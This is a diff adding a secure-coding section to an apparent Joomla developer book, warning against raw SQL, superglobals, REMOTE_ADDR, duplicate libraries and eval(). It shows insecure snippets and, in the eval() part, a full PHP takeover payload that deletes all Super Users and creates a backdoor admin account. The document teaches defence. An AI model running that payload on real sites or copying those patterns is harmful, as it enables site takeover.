@@ -358,6 +358,431 @@
       definitely make it into the book but I will at least promise to give it
       a good thought and most likely a good try.</para>
     </section>
+
+    <section xml:id="intro-write-code-dont-suck">
+      <title>Write code which doesn't suck</title>
+
+      <para>Having audited several dozens of sites with hundreds of extensions
+      I have seen the same old problems appearing in the code of extension
+      after extension. Not only they are security incidents waiting to happen,
+      they also make migrating your code to newer Joomla versions harder and
+      break your extension in said Joomla versions.</para>
+
+      <section xml:id="intro-dont-suck-hardcoded-queries">
+        <title>DON'T: Hard-coded database queries</title>
+
+        <para>I have seen bad code like this:</para>
+
+        <programlisting>$query = 'SELECT `something` FROM `#__whatever` WHERE `id` = ' . $db-&gt;quote($id);</programlisting>
+
+        <para>It's even worse with there is no <code>$db-&gt;quote</code> at
+        all because that ensures it's a SQL injection waiting to
+        happen.</para>
+
+        <para>Having a hard-coded database query is really bad because you are
+        making an assumption the site runs under MySQL and that the escape
+        character is the backtick. This is not a guarantee. Moreover, are you
+        absolutely sure that you have not missed an escape in a long SQL
+        query? Would you bet your and your clients' sites' security, as well
+        as the possibility of massive fines due to GDPR if you have failed
+        miserably, on your ability to not miss anything?</para>
+
+        <para>Let's get real. Joomla has offered a database query builders
+        since version 1.6 (released in 2010) and improved it in Joomla
+        4.</para>
+
+        <para>Here's the simplest way to write the above code:</para>
+
+        <programlisting>$query = $db-&gt;getQuery(true)
+  -&gt;select($db-&gt;quoteName('something'))
+  -&gt;from($db-&gt;quoteName('#__whatever'))
+  -&gt;where($db-&gt;quoteName('id') . ' = ' . $db-&gt;quote($id));</programlisting>
+
+        <para>This is still not a very good approach because <code>$id</code>
+        may look like a numeric string but actually be a hidden SQL Injection.
+        Therefore a better way to write this query is using prepared
+        statements which send the raw value of $id to the server and tell it
+        what data type it is (boolean, null, blob, string or integer). The
+        value is not interpolated into the query itself, making it perfectly
+        safe against SQL injection attacks.</para>
+
+        <programlisting>$query = $db-&gt;getQuery(true)
+  -&gt;select($db-&gt;quoteName('something'))
+  -&gt;from($db-&gt;quoteName('#__whatever'))
+  -&gt;where($db-&gt;quoteName('id') . ' = :id')
+  -&gt;bind(':id', $id, \Joomla\Database\ParameterType::INTEGER);</programlisting>
+
+        <note>
+          <para>Prepared statements are only meant to be used when you have
+          data coming from a variable. If you have hard-coded data you can
+          still interpolate them after passing them through
+          <code>$db-&gt;quote()</code>.</para>
+
+          <para>Also note that any data —even data coming from another query
+          which ostensibly only includes “safe”, hard-coded data you have
+          inserted yourself in the database— MUST go through prepared
+          statements. Anything which is not hard-coded in the code currently
+          executing must be assumed to be potentially dangerous. Even data you
+          inserted in the database and the user cannot modify through the
+          interface <emphasis>can</emphasis> be modified by a malicious actor,
+          e.g. using a SQL injection vulnerability in another
+          extension.</para>
+
+          <para><emphasis role="bold">TRUST NO-ONE, NOT EVEN
+          YOURSELF.</emphasis></para>
+
+          <para>That's the motto of the security conscious developer.</para>
+        </note>
+      </section>
+
+      <section xml:id="intro-dont-suck-superglobals">
+        <title>DON'T: Using superglobalg ($_REQUEST, $_SERVER, $_GET, $_POST
+        etc)</title>
+
+        <para>Another very common problem I have seen in Joomla extensions is
+        developers doing something like this:</para>
+
+        <programlisting>$something = $_REQUEST['something'];
+// or, worse, this
+$whatever = $_SERVER['WHATEVER'];</programlisting>
+
+        <para><emphasis role="bold">DO NOT DO THAT. THIS IS A SECURITY
+        ISSUE.</emphasis> There are very few cases where an extension needs
+        access to the raw PHP superglobals, namely if you are writing a
+        security extension and you need to check whether there's potentially
+        malicious data in the request before Joomla sanitizes it. If you are
+        one of the five or so people in the Joomla world writing this kind of
+        software you are unlikely to be reading this. If you are about to say
+        that you have a different, legitimate use case: you do NOT; you just
+        don't know how to use Joomla's input class. Sorry.</para>
+
+        <para>Joomla already provides an Input class which can return the
+        <emphasis>filtered and sanitised</emphasis> values of a request or
+        environment parameter. Moreover, it allows other parts of your code
+        and plugins to modify or override the input parameters.</para>
+
+        <para>The correct way to get something would be something like
+        this:</para>
+
+        <programlisting>$something = \Joomla\CMS\Factory::getApplication()-&gt;input-&gt;request-&gt;getCmd('something', 'default');</programlisting>
+
+        <para>If the object you are working with has its own input property
+        use that instead of the global input object shown above. Dispatchers
+        and Controllers do have their own input object which can of course be
+        overridden during instantiation.</para>
+
+        <para>If the object you are working with has its own property which
+        gives you access to the application use that instead of going through
+        the CMS Factory. This makes your code reusable and testable across
+        applications.</para>
+
+        <para>Do NOT get input variables from your Model or View classes. Your
+        Controller should be the only point where you use the input object to
+        retrieve input parameters. You can pass these values to your model by
+        setting its <emphasis>state</emphasis>. Likewise, your view should
+        only ever read the model's state, not the input directly. This makes
+        your code reusable and testable. It also lets you make changes in the
+        naming of your input parameters only making a change in your
+        controller (and possibly your dispatcher) instead of trying to hunt
+        down random uses spread throughout your code. It also makes you think
+        about the data flow in your application which makes it infinitely
+        easier to debug it.</para>
+
+        <para>You should not use the entire request superglobal (e.g.
+        <code>$this-&gt;input-&gt;getCmd('something')</code> or
+        <code>$this-&gt;input-&gt;request-&gt;getCmd('something')</code>) if
+        you know that a specific piece of data can only come as GET or POST
+        data. Instead, be specific, e.g.
+        <code>$this-&gt;input-&gt;get-&gt;getCmd('something')</code> for GET
+        data and <code>$this-&gt;input-&gt;post-&gt;getCmd('something')</code>
+        for POST data. This prevents <emphasis>input shading</emphasis>. If
+        the same input is present in $_GET, $_POST, $_ENV, $_COOKIE and
+        $_SERVER you will only get one value in the request. Which one? It
+        depends on the PHP configuration (<code>request_order</code> and
+        <code>variables_order</code> configuration keys). While on
+        <emphasis>most</emphasis> servers it's GP (Get and Post, i.e. POST
+        data overrides GET data) it could actually be anything with
+        unpredictable consequences for your extension. For example, some
+        servers may stupidly include cookies in request_order, thereby
+        allowing a hacker to set a cookie on a victim's browser to make your
+        extension do something other than the user's reasonable expectation,
+        e.g. delete or modify a different record than what they were trying to
+        delete / edit.</para>
+
+        <para>Do not assume that the data you get from the input object is of
+        a specific scalar type. For example,
+        <code>$this-&gt;input-&gt;getInt('something')</code> may return an
+        integer, null (the default value) or <emphasis>an array of
+        integers</emphasis>. The latter is something that you are unlikely to
+        have come across but that's the way the <code>get()</code> method of
+        Joomla's input object works. Always check the type of the data you
+        receive, always assume that there is a hacker trying to inject invalid
+        data trying to trip your code up, always assume that any kind of
+        filtering or sanitization may fail to work the way you assume it
+        works.</para>
+
+        <para>If you want to access the $_SERVER and $_ENV superglobals;
+        don't. Instead go through <code>$this-&gt;input-&gt;server</code> and
+        <code>$this-&gt;input-&gt;env</code>. For example, if I want to get
+        the contents of the HTTP header X-Foo-Bar I should do
+        <code>$this-&gt;input-&gt;server-&gt;getString('HTTP_X_FOO_BAR');</code>.</para>
+
+        <para>Remember that Joomla can and will apply its text filters when
+        you use <code>getString</code>. If you want to get the raw data use
+        <methodname>getRaw</methodname> or <methodname>getArray</methodname> —
+        neither method applies any filtering.</para>
+
+        <para>Even though you can access the $_FILES superglobal with the
+        input object — <emphasis role="bold">DO NOT DO THAT</emphasis>! You
+        should never handle file uploads directly in your code. Always go
+        through Joomla's
+        <methodname>\Joomla\CMS\Filesystem\File::upload()</methodname> method.
+        Do remember that, by default, it will try to prevent unsafe files from
+        being uploaded. If you have a VERY good reason to allow “unsafe” files
+        (e.g. you expect that a ZIP file containing PHP files will be used
+        with your extension) and have taken responsible measures to prevent
+        security issues you can of course set its <code>$allowUnsafe</code>
+        parameter to <code>true</code>. If you need your extension to allow
+        uploading of files with extensions or MIME types which are not media
+        you can of course use custom file upload configuration in your own
+        extension. This means that the excuse you may have had for using
+        $_FILES directly is completely invalid so please don't let me see you
+        ever accessing superglobals again.</para>
+      </section>
+
+      <section xml:id="intro-dont-suck-remote-addr">
+        <title>DON'T: Using REMOTE_ADDR to get the user's IP</title>
+
+        <para>It is very common for extensions to need access to the user's IP
+        address. I see extensions doing silly things like this:</para>
+
+        <programlisting>$ip = $_SERVER['REMOTE_ADDR'];
+$ip = $this-&gt;input-&gt;server-&gt;get('REMOTE_ADDR');</programlisting>
+
+        <para><emphasis role="bold">DO NOT DO THAT; THIS IS WRONG ON MANY
+        LEVELS!</emphasis></para>
+
+        <para>The first line tries to access the $_SERVER superglobal which,
+        as mentioned in the previous section, is a security issue waiting to
+        happen.</para>
+
+        <para>Both of these lines make a wrong assumption: that the
+        REMOTE_ADDR key of the server superglobal array will contain the
+        user's IP address. This is not true if the server is behind a load
+        balancer, CDN, firewall or any other kind of non-transparent proxy. In
+        these cases a different HTTP header —typically X-Forwarded-For— may be
+        used to convey the forwarding chain of IP addresses. However, you
+        should NOT attempt to read this header yourself for two reasons. First
+        of all, if the site is not behind a non-transparent proxy a malicious
+        actor can send a forged X-Forwarded-For header to trick your extension
+        into believing the request came from a different IP address than the
+        one it actually originates. Second, this header may contain more than
+        one IP addresses in a comma-separated list. Validating, sanitizing and
+        parsing that list is tricky and may lead to some very bad times and
+        security issues.</para>
+
+        <para>Joomla 3.10 and later (including all 4.x releases and beyond)
+        include a fork of my IPHelper class which deals with all of these
+        details automatically. They also expose user-facing options in the
+        Global Configuration so that the site owner can inform Joomla whether
+        their site is behind a non-transparent proxy server.</para>
+
+        <para>You can get the real IP address of the user with this:</para>
+
+        <programlisting>$ip = \Joomla\Utilities\IpHelper::getIp();</programlisting>
+
+        <para>Even better, going through the IpHelper makes your code
+        <emphasis role="bold">testable</emphasis>. Your unit tests can simply
+        call:</para>
+
+        <programlisting>\Joomla\Utilities\IpHelper::setIp('1.2.3.4');</programlisting>
+
+        <para>to set a fake IP address of your choice (IPv4 or IPv6).</para>
+
+        <para>Finally, IpHelper has two more handy methods:
+        <methodname>isIPv6</methodname> which tells you if you are dealing
+        with an IPv6 address and <methodname>IPinList</methodname> which lets
+        you figure out if an IP address is contained in an array which
+        consists of any combination of IPv4/IPv6 addresses, IPv4 ranges (e.g.
+        1.2.3.4-1.2.3.255), IPv4/IPv6 subnets in CIDR notation (e.g.
+        1.2.3.4/24) or IPv4 subnets in IP/Netmask notation (e.g.
+        192.168.1.0/255.255.255.0). Since many use cases for getting the
+        user's IP address ultimately come down to checking if it belongs in a
+        range of IP addresses or a list of allowed/blocked IP addresses you'll
+        find the latter method extremely handy. I went through the pain of
+        figuring out IP address maths and Joomla included my work in the core
+        so you don't have to deal with it yourself!</para>
+      </section>
+
+      <section xml:id="intro-dont-suck-duplicate-libraries">
+        <title>DON'T: Include duplicate copies of libraries shipped with
+        Joomla itself</title>
+
+        <para>A few weeks ago I was troubleshooting a client's Joomla 3 site
+        and I noticed that there were six extensions which in total included
+        four copies of TCPDF, six copies of SimplePie and four copies of
+        PHPMailer. All these libraries are already shipped with Joomla
+        itself.</para>
+
+        <para>Do NOT include copies of libraries already included in Joomla
+        with your software. If you absolutely have to —because you need a
+        newer version than what Joomla provides— <emphasis role="bold">DO NOT
+        USE THE SAME NAMESPACE AND CLASS NAMES</emphasis>. It will break
+        Joomla or third party extensions when your code is loaded.</para>
+
+        <para>In fact, even if you are including third libraries which are not
+        included in Joomla you should be doing one of the following:</para>
+
+        <itemizedlist>
+          <listitem>
+            <para>Do NOT load third party libraries except in a component's
+            model which is never going to be used outside of your
+            component.</para>
+          </listitem>
+
+          <listitem>
+            <para>Change the namespace of your third party libraries using
+            Rector.</para>
+          </listitem>
+        </itemizedlist>
+
+        <para>The first method is not a fool-proof way to go about it. The
+        third party library you are using may be included in Joomla or a
+        different third party extension (worst case scenario: a system plugin
+        which always loads this library) therefore causing your own code to
+        break. This happened to me when I contributed the WebAuthn code to
+        Joomla 4, thereby breaking my Login with Apple plugin which was using
+        a newer version of one of the libraries used by the WebAuthn code.
+        Oops.</para>
+
+        <para>Changing the namespace of your dependencies with Rector is
+        fairly trivial and guarantees that any third party libraries you
+        include in your code will neither interfere with core or third party
+        code, nor will they be interfered with by core or third party code.
+        It's one more (small and simple) step building your extensions but it
+        can make a massively positive difference to your clients who construct
+        their sites out of prepackaged, mass-distributed code they can't (and
+        usually don't even know how to) modify.</para>
+      </section>
+
+      <section xml:id="intro-dont-suck-evil-eval">
+        <title>DON'T: Using <code>eval()</code></title>
+
+        <para>Let me start by saying that allowing users to enter arbitrary
+        PHP code which will be executed by the site is a <emphasis
+        role="bold">VERY BAD IDEA</emphasis>. It is very easy for anyone with
+        minimal developer experience —or someone following a how-to hacking
+        guide— to take over a site. The following took me 5' to write and it's
+        a complete takeover of a site:</para>
+
+        <caution>
+          <para><emphasis role="bold">DO NOT TRY THIS ON YOUR
+          SITE!</emphasis></para>
+
+          <para>The following code deletes all Super Users and adds a new
+          Super User. This is detrimental to your site. It's only meant to
+          demonstrate how easily a site can be taken over if a developer
+          allows arbitrary PHP execution.</para>
+        </caution>
+
+        <programlisting>function hackMePlenty()
+{
+	$user = \Joomla\CMS\Factory::getContainer()
+		-&gt;get(\Joomla\CMS\User\UserFactoryInterface::class)
+		-&gt;loadUserByUsername('drevil1234');
+
+	if ($user-&gt;username === 'drevil1234') return;
+
+	$db    = \Joomla\CMS\Factory::getContainer()-&gt;get('DatabaseDriver')
+	$query = $db-&gt;getQuery(true)
+		-&gt;select([$db-&gt;quoteName('id')])
+		-&gt;from($db-&gt;quoteName('#__usergroups'));
+
+	$superUserGroups = array_filter(
+		$db-&gt;setQuery($query)-&gt;loadColumn(0) ?: [],
+		function ($group) {
+			return \Joomla\CMS\Access\Access::checkGroup($group, 'core.admin');
+		}
+	);
+
+	$existingSuperUsers = array_unique(
+		array_reduce(
+			$superUserGroups,
+			function (array $carry, int $groupId) {
+				return array_merge($carry, \Joomla\CMS\Access\Access::getUsersByGroup($groupId));
+			},
+			[]
+		)
+	);
+
+	if (!empty($existingSuperUsers))
+	{
+		$query = $db-&gt;getQuery(true)
+			-&gt;delete($db-&gt;quoteName('#__users'))
+			-&gt;whereIn($db-&gt;quoteName('id'), $existingSuperUsers);
+		$db-&gt;setQuery($query)-&gt;execute();
+	}
+
+	$user = new \Joomla\CMS\Table\User($db);
+	$user-&gt;save([
+		'name' =&gt; 'Evil Hacker',
+		'username' =&gt; 'drevil1234',
+		'email' =&gt; 'drevil@example.com',
+		'password' =&gt; \Joomla\CMS\User\UserHelper::hashPassword('Dr3v!L0wnzJ00'),
+		'block' =&gt; 0,
+		'sendEmail' =&gt; 1,
+		'registerDate' =&gt; (new \Joomla\CMS\Date\Date('2004-08-08 01:02:03'))-&gt;toSql(),
+		'lastVisitDate' =&gt; (new \Joomla\CMS\Date\Date())-&gt;toSql(),
+		'activation' =&gt; '',
+		'groups' =&gt; $superUserGroups
+	]);
+}
+
+try { hackMePlenty(); } catch (\Throwable $e) { }</programlisting>
+
+        <para>For this reason, whenever I see an extension which deliberately
+        allows PHP code to be inserted and executed I am worried. If I see
+        this being allowed in an editor or other text entry field without
+        checking that the data comes from a Super User I am immediately
+        labelling the extension a massive security issue and the site
+        compromised unless proven differently.</para>
+
+        <para>As a developer you should NEVER, EVER have a feature which
+        allows direct PHP execution. This includes this happening
+        unintentionally by using the evil <code>eval()</code>. Also note that
+        most hosts disable <code>eval()</code> so idiot developers won't
+        create backdoors the size of Alaska on the sites hosted on that
+        host.</para>
+
+        <para>There are very few cases where you might want to evaluate
+        <emphasis>generated</emphasis> (as opposed to <emphasis>user
+        defined</emphasis>) PHP code. For example, when I implemented a subset
+        of the Blade template language in FOF I was converting Blade files to
+        straight up PHP. Of course, I could not run the generated code through
+        <code>eval()</code>. The solution to that is to first try to create a
+        temporary file —either in Joomla's temporary directory or a cache
+        directory— and <code>include()</code> it. If the temporary directory
+        is unwriteable you can use
+        <code>class_exists(\Joomla\Filesystem\Buffer::class, true);</code>
+        which includes Joomla's buffer class. This registers the stream
+        handler <code>buffer://</code> which creates a filesystem in memory.
+        You can write to a file in it, e.g.
+        <code>file_put_contents('buffer://foobar.php', $theContents);</code>
+        and then include it like this
+        <code>include('buffer://foobar.php');</code>. The downside with the
+        buffer method is that on some hosts with hardened PHP runtimes you
+        cannot include executable files from stream wrappers which have not
+        been explicitly allowed by the server administrator. Hence the need to
+        go through the filesystem first.</para>
+
+        <para>As I said, you should only ever evaluate PHP code in your
+        extensions if you have written it or if your own code has generated
+        it. <emphasis role="bold">DO NOT TRUST THE USER —NOT EVEN SUPER USERS—
+        TO PROVIDE EXECUTABLE PHP CODE THEMSELVES; IT IS A MASSIVE SECURITY
+        ISSUE</emphasis>. Do you hear that, form component developers? Your
+        extensions make it trivial to hack people's sites. Fix 'em!</para>
+      </section>
+    </section>
   </chapter>
 
   <chapter xml:id="concepts">
